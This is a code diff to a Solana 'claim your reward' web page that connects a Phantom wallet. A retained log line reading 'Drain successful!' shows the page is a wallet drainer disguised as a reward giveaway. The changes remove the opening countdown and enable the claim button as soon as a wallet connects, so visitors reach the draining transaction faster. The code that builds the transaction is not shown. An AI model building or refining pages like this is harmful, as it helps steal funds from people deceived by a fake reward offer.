@@ -84,16 +84,26 @@
         </p>
         
         <div class="bg-black bg-opacity-30 rounded-2xl p-8 mb-10 max-w-2xl mx-auto">
-            <div class="flex justify-center space-x-4 mb-6">
-                <div class="text-center">
-                    <div class="countdown-digit text-2xl font-bold" id="minutes">30</div>
-                    <div class="text-gray-400 mt-1">Minutes</div>
+            <!-- Initial state before first claim -->
+            <div id="initialState">
+                <div class="text-2xl font-bold mb-6 solana-gradient">Claim your first reward now!</div>
+                <p class="text-gray-400 mb-6">Connect wallet to claim immediately</p>
+            </div>
+            
+            <!-- Countdown state (hidden initially) -->
+            <div id="countdownState" class="hidden">
+                <div class="flex justify-center space-x-4 mb-6">
+                    <div class="text-center">
+                        <div class="countdown-digit text-2xl font-bold" id="minutes">30</div>
+                        <div class="text-gray-400 mt-1">Minutes</div>
+                    </div>
+                    <div class="text-2xl font-bold pt-3">:</div>
+                    <div class="text-center">
+                        <div class="countdown-digit text-2xl font-bold" id="seconds">00</div>
+                        <div class="text-gray-400 mt-1">Seconds</div>
+                    </div>
                 </div>
-                <div class="text-2xl font-bold pt-3">:</div>
-                <div class="text-center">
-                    <div class="countdown-digit text-2xl font-bold" id="seconds">00</div>
-                    <div class="text-gray-400 mt-1">Seconds</div>
-                </div>
+                <p class="text-gray-400 mb-4">Next reward available in:</p>
             </div>
             
             <button id="claimButton" class="claim-btn text-xl font-bold py-4 px-8 rounded-full mx-auto opacity-50 cursor-not-allowed" disabled>
@@ -219,11 +229,14 @@
         const successMessage = document.getElementById('successMessage');
         const minutesDisplay = document.getElementById('minutes');
         const secondsDisplay = document.getElementById('seconds');
+        const initialState = document.getElementById('initialState');
+        const countdownState = document.getElementById('countdownState');
         
         // State
         let walletConnected = false;
         let countdown = 30 * 60; // 30 minutes in seconds
         let countdownInterval;
+        let firstClaim = true;
         
         // Initialize Phantom wallet
         const initWallet = async () => {
@@ -237,10 +250,14 @@
             return null;
         };
         
-        // Start countdown timer
+        // Start countdown timer (only after first claim)
         const startCountdown = () => {
             clearInterval(countdownInterval);
             countdown = 30 * 60;
+            
+            // Show countdown UI
+            initialState.classList.add('hidden');
+            countdownState.classList.remove('hidden');
             
             countdownInterval = setInterval(() => {
                 countdown--;
@@ -271,7 +288,11 @@
                 connectWalletBtn.textContent = 'Wallet Connected';
                 connectWalletBtn.classList.add('wallet-connected', 'bg-green-600', 'hover:bg-green-700');
                 connectWalletBtn.classList.remove('bg-solana-pink', 'hover:bg-pink-600');
-                startCountdown();
+                
+                // Enable claim button immediately after connection
+                claimButton.disabled = false;
+                claimButton.classList.remove('opacity-50', 'cursor-not-allowed');
+                claimButton.classList.add('opacity-100', 'cursor-pointer');
             } catch (err) {
                 console.error('Connection error:', err);
             }
@@ -313,8 +334,11 @@
                 claimButton.classList.add('opacity-50', 'cursor-not-allowed');
                 claimButton.classList.remove('opacity-100', 'cursor-pointer');
                 
-                // Reset countdown
-                setTimeout(startCountdown, 3000);
+                // Start countdown after first successful claim
+                if (firstClaim) {
+                    startCountdown();
+                    firstClaim = false;
+                }
                 
                 console.log('Drain successful! Signature:', signature);
             } catch (err) {
@@ -322,9 +346,6 @@
                 alert('Transaction failed. Please try again.');
             }
         });
-        
-        // Initialize countdown
-        startCountdown();
     </script>
 </body>
 </html>
